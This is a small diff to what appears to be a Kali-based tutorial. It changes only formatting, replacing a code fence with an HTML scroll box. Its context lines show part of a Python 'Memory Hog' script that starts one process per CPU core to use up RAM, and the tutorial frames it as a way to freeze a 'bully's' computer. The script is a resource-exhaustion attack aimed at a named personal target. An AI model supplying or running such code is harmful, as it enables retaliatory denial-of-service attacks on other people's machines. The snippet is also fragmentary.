@@ -222,7 +222,7 @@ Actually go back to the Kali machine to see if you received a notification
 Use the following scripts to 
 Memory Hog (Consumes RAM Until the Bully’s System Freezes)
 
-``` python
+<div class="scroll-box">
 #!/usr/bin/env python3    
 import multiprocessing    
 import time    
@@ -238,4 +238,4 @@ if __name__ == "__main__":
     for _ in range(multiprocessing.cpu_count()):    
         p = multiprocessing.Process(target=memory_hog)    
         p.start()    
-```
+</div>
